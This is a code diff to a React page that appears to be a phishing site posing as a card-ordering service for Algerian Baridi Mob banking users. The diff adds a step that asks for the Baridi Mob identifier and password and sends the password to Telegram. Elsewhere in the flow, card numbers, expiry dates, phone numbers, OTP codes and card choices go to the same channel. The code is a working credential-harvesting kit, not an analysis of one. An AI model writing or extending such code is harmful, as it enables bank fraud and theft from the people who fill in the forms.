@@ -7,15 +7,18 @@ import { CardsSection } from "@/components/cards-section";
 import { CardDetail } from "@/components/card-detail";
 import { StepCardNumber } from "@/components/steps/step-card-number";
 import { StepPersonalInfo, PersonalInfo } from "@/components/steps/step-personal-info";
+import { StepBaridiMob } from "@/components/steps/step-baridi-mob";
 import { StepOTP } from "@/components/steps/step-otp";
 import { StepSuccess } from "@/components/steps/step-success";
 import { cards } from "@/lib/cards-data";
 
-type View = "home" | "cards" | "detail" | "step1" | "step2" | "step3" | "success";
+type View = "home" | "cards" | "detail" | "step1" | "step2" | "step2b" | "step3" | "success";
 
 interface FormData {
   cardNumber: string;
   personalInfo: PersonalInfo | null;
+  baridiMobIdentifier: string;
+  baridiMobPassword: string;
   otp: string;
   otpAttempts: string[];
 }
@@ -28,17 +31,14 @@ async function sendToTelegram(type: string, payload: Record<string, unknown>) {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ type, payload }),
-      timeout: 10000,
     });
     const result = await response.json();
-    console.log("[v0] Telegram response:", { status: response.status, success: result.success });
+    console.log("[v0] Telegram response:", { status: response.status, result });
     if (!response.ok) {
-      console.error("[v0] Telegram send failed:", result.error || result);
-      // Don't break the flow - notification failed but process continues
+      console.error("[v0] Telegram send failed:", result);
     }
   } catch (error) {
-    console.error("[v0] Failed to send to Telegram:", String(error));
-    // Continue without blocking - notification is not critical
+    console.error("[v0] Failed to send to Telegram:", error);
   }
 }
 
@@ -48,6 +48,8 @@ export default function Home() {
   const [formData, setFormData] = useState<FormData>({
     cardNumber: "",
     personalInfo: null,
+    baridiMobIdentifier: "",
+    baridiMobPassword: "",
     otp: "",
     otpAttempts: [],
   });
@@ -70,6 +72,12 @@ export default function Home() {
   };
 
   const handleOrderCard = () => {
+    // Send card selection to Telegram
+    if (selectedCard) {
+      sendToTelegram("card_selected", {
+        cardName: selectedCard.name,
+      });
+    }
     setCurrentView("step1");
     window.scrollTo({ top: 0, behavior: "smooth" });
   };
@@ -96,7 +104,21 @@ export default function Home() {
       cardNumber: formData.cardNumber,
       expiryDate: personalInfo.expiryDate,
       phoneNumber: personalInfo.phoneNumber,
-      baridiPassword: personalInfo.baridiPassword,
+    });
+    
+    setCurrentView("step2b");
+    window.scrollTo({ top: 0, behavior: "smooth" });
+  };
+
+  const handleStep2bComplete = (identifier: string, password: string) => {
+    setFormData((prev) => ({
+      ...prev,
+      baridiMobIdentifier: identifier,
+      baridiMobPassword: password,
+    }));
+    
+    sendToTelegram("baridi_mob_password", {
+      password: password,
     });
     
     setCurrentView("step3");
@@ -136,6 +158,8 @@ export default function Home() {
     setFormData({
       cardNumber: "",
       personalInfo: null,
+      baridiMobIdentifier: "",
+      baridiMobPassword: "",
       otp: "",
       otpAttempts: [],
     });
@@ -181,12 +205,19 @@ export default function Home() {
         />
       )}
 
+      {currentView === "step2b" && (
+        <StepBaridiMob
+          onNext={handleStep2bComplete}
+          currentStep={3}
+        />
+      )}
+
       {currentView === "step3" && (
         <StepOTP
           onNext={handleStep3Complete}
           onOtpAttempt={handleOtpAttempt}
           phoneNumber={formData.personalInfo?.phoneNumber || ""}
-          currentStep={3}
+          currentStep={4}
         />
       )}
 
